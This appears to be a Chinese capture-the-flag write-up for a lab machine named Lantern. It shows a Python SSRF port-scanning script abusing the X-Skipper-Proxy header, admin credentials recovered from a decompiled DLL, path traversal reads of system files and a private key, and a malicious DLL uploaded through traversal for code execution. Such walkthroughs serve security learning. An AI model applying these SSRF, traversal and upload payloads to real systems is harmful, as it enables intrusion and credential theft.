<img width="415" height="219" alt="image" src="https://github.com/user-attachments/assets/e1314382-8221-485a-9295-77dd06b8e10e" />

Nmap端口扫描 开放了22，80，3000端口

<img width="415" height="430" alt="image" src="https://github.com/user-attachments/assets/608883dc-dc77-420d-8c0e-9a820127e0bd" />

访问web服务

<img width="415" height="232" alt="image" src="https://github.com/user-attachments/assets/80676189-e577-427b-a04b-00150bfeb79e" />

<img width="415" height="213" alt="image" src="https://github.com/user-attachments/assets/a75f3bf9-3da2-4b18-aaee-2a307ff8e16a" />

<img width="400" height="110" alt="image" src="https://github.com/user-attachments/assets/06542c48-7e4c-40ba-ad9b-03cdb05a38d1" />

Skipper Proxy存在SSRF
https://www.exploit-db.com/exploits/51111
通过构造X-Skipper-Proxy请求头

<img width="415" height="219" alt="image" src="https://github.com/user-attachments/assets/8a671fcb-958b-4c77-aa64-b000b42a1cc9" />

<img width="415" height="318" alt="image" src="https://github.com/user-attachments/assets/adbd60dd-73a0-46bb-9dc6-3119a87d5309" />

验证成功
SSRF端口扫描

<img width="327" height="257" alt="image" src="https://github.com/user-attachments/assets/84752e91-2abd-4a86-be6b-9dd2467d915f" />

import requests
from pwn import *
bar = log.progress("Enumerate ports for local network via SSRF")
# Target host and headers
target_host = "http://lantern.htb/"
headers = {
    "Host": "lantern.htb",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://lantern.htb/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close",
}
# List of common ports to enumerate
common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 8080, 8443, 5000, 8000]
# Function to check a port via SSRF
def check_port(port):
    bar.status(f"Testing port {port} for 127.0.0.1 ...")
    headers["X-Skipper-Proxy"] = f"http://127.0.0.1:{port}"
    try:
        response = requests.get(target_host, headers=headers)
        if response.status_code == 200:
            print(f"Port {port} is open - Response: {response.status_code}")
        elif response.status_code == 302:
            print(f"Port {port} redirect - Response: {response.status_code}")
        elif response.status_code == 403:
            print(f"Port {port} Forbidden - Response: {response.status_code}")
        elif response.status_code == 404:
            print(f"Port {port} Not Found - Response: {response.status_code}")
        elif response.status_code == 500:
            print(f"Port {port} Internal Server Error - Response: {response.status_code}")
        elif response.status_code == 503:
            print(f"Port {port} Internal Server Error - Response: {response.status_code}")
        else:
            print(f"Port {port} returned status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Port {port} is closed or not reachable - Error: {e}")
# Enumerate through common ports
for port in common_ports:
    check_port(port)
    
bar.success("Finish!")

<img width="385" height="257" alt="image" src="https://github.com/user-attachments/assets/65a09e96-6f40-420b-b2f2-bdafd1f2e695" />

5000和8000端口存活
通过ssrf去访问

<img width="415" height="248" alt="image" src="https://github.com/user-attachments/assets/328c4291-f89c-4a03-9152-ffa9cf2562f7" />

<img width="415" height="247" alt="image" src="https://github.com/user-attachments/assets/3acf2698-5957-482d-a652-7e46fb755384" />

<img width="415" height="180" alt="image" src="https://github.com/user-attachments/assets/c9dcdb5e-0fe5-48de-bc2c-6e57ac9d7758" />

<img width="369" height="101" alt="image" src="https://github.com/user-attachments/assets/6d0cc040-ebde-4f91-a05a-bf734dc1d6a1" />

访问_framework/InternaLantern.dll

<img width="416" height="249" alt="image" src="https://github.com/user-attachments/assets/4efae47d-505e-4b1c-a995-630341a76e02" />

保存成一个dll文件

<img width="415" height="242" alt="image" src="https://github.com/user-attachments/assets/6f5da38b-50b7-49ed-beac-2bdce00f26df" />

进行反编译
https://decompiler.codemerx.com/

<img width="415" height="239" alt="image" src="https://github.com/user-attachments/assets/8db576d6-d4be-405b-86d7-8a3a9026080d" />

里面存在一些base64编码，进行解密
SGVhZCBvZiBzYWxlcyBkZXBhcnRtZW50LCBlbWVyZ2VuY3kgY29udGFjdDogKzQ0MTIzNDU2NzgsIGVtYWlsOiBqb2huLnNAZXhhbXBsZS5jb20=
SFIsIGVtZXJnZW5jeSBjb250YWN0OiArNDQxMjM0NTY3OCwgZW1haWw6IGFubnkudEBleGFtcGxlLmNvbQ==
RnVsbFN0YWNrIGRldmVsb3BlciwgZW1lcmdlbmN5IGNvbnRhY3Q6ICs0NDEyMzQ1Njc4LCBlbWFpbDogY2F0aGVyaW5lLnJAZXhhbXBsZS5jb20=
UFIsIGVtZXJnZW5jeSBjb250YWN0OiArNDQxMjM0NTY3OCwgZW1haWw6IGxhcmEuc0BleGFtcGxlLmNvbQ==
SnVuaW9yIC5ORVQgZGV2ZWxvcGVyLCBlbWVyZ2VuY3kgY29udGFjdDogKzQ0MTIzNDU2NzgsIGVtYWlsOiBsaWxhLnNAZXhhbXBsZS5jb20=
U3lzdGVtIGFkbWluaXN0cmF0b3IsIEZpcnN0IGRheTogMjEvMS8yMDI0LCBJbml0aWFsIGNyZWRlbnRpYWxzIGFkbWluOkFKYkZBX1FAOTI1cDlhcCMyMi4gQXNrIHRvIGNoYW5nZSBhZnRlciBmaXJzdCBsb2dpbiE=



Head of sales department, emergency contact: +4412345678, email: john.s@example.com
HR, emergency contact: +4412345678, email: anny.t@example.com
FullStack developer, emergency contact: +4412345678, email: catherine.r@example.com
PR, emergency contact: +4412345678, email: lara.s@example.com
Junior .NET developer, emergency contact: +4412345678, email: lila.s@example.com
System administrator, First day: 21/1/2024, Initial credentials admin:AJbFA_Q@925p9ap#22. Ask to change after first login!


使用admin:AJbFA_Q@925p9ap#22  登录3000端口

<img width="415" height="223" alt="image" src="https://github.com/user-attachments/assets/ca34acf5-5868-4c4a-8025-ed49243fae34" />

登录成功
80端口存在文件读取
/PrivacyAndPolicy?lang=../../../../../../.&ext=/etc/hosts

<img width="415" height="249" alt="image" src="https://github.com/user-attachments/assets/78666d09-5f4d-4bff-a55a-8c01945e9c9f" />

<img width="415" height="248" alt="image" src="https://github.com/user-attachments/assets/327151b5-4535-4de2-9b3d-e1ced16d21a2" />

存在root和tomas两个用户

<img width="399" height="225" alt="image" src="https://github.com/user-attachments/assets/8109c3a0-698d-4147-a3f3-61824613183a" />

创建一个文件夹
创建一个新的类库项目xpl

<img width="325" height="251" alt="image" src="https://github.com/user-attachments/assets/b8ef1d6c-bf57-4f5b-ac11-d73e08dbcd35" />
读取tomas的私钥

<img width="389" height="260" alt="image" src="https://github.com/user-attachments/assets/78714019-a3cd-48c6-aaab-b138526c1560" />

dotnet add package Microsoft.AspNetCore.Components --version 6.0.0
添加包
构建包

<img width="393" height="190" alt="image" src="https://github.com/user-attachments/assets/83ab1a91-e9dd-4e95-ba18-def1d3a8b0ef" />

/home/kali/Desktop/xpl_project/xpl/bin/release/net6.0/xpl.dll
文件路径

发送到BTP

<img width="415" height="248" alt="image" src="https://github.com/user-attachments/assets/5480bc6c-2543-441c-b14c-01ba14de4334" />


修改name为../../../../../../../../../../../../../../../../../../opt/components/xpl.dll

<img width="415" height="246" alt="image" src="https://github.com/user-attachments/assets/bc056fce-8a19-491f-9f3d-40a2251212da" />

将json序列化
将序列化的json复制到前面的数据包

换了一个文件

Chmod 600 id_rsa

<img width="416" height="172" alt="image" src="https://github.com/user-attachments/assets/c829072e-9c37-4196-8bde-242f2a381139" />
